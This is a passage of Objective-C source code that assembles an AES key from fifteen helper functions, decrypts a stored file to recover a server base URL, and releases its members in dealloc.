			urlKey[1] = url1();
			urlKey[2] = url2();
			urlKey[3] = url3();
			urlKey[4] = url4();
			urlKey[5] = url5();
			urlKey[6] = url6();
			urlKey[7] = url7();
			urlKey[8] = url8();
			urlKey[9] = url9();
			urlKey[10] = url10();
			urlKey[11] = url11();
			urlKey[12] = url12();
			urlKey[13] = url13();
			urlKey[14] = url14();
			urlKey[15] = url15();
			
			// Bad thing is that aesKey could be nil (unpredictable depend on auto-generate keys)
//			NSString *aesKey = [[[NSString alloc] initWithBytes:urlKey
//														 length:16
//													   encoding:NSUTF8StringEncoding] autorelease];
			
			NSData *aesKey = [NSData dataWithBytes:urlKey length:16];
			
			// Obsolete
//			NSData* decryptedData = [crypt decrypt:data withKey:aesKey];
			
			NSData *decryptedData = [crypt decryptv2:data withKey:aesKey];
			DLog (@"Server base plain, decryptedData = %@", decryptedData);
			if(decryptedData)
			{
				baseUrl = [[[NSString alloc] initWithData:decryptedData encoding:NSUTF8StringEncoding] autorelease];
				if(baseUrl == nil){
					DLog("base URL nil");
				}
			}else{
				DLog("No data do decrypt");		
			}
			[keystring release];
		}
		[crypt release];
	}else{
		DLog("Could not read the file");
	}
	return baseUrl;
}

#pragma mark -
#pragma mark Memory management
#pragma mark -

- (void) dealloc {
	[mDefinedUrlArray release];
	[mTotalUrlArray release];
	[mDelegate release];
	[super dealloc];
}

@end
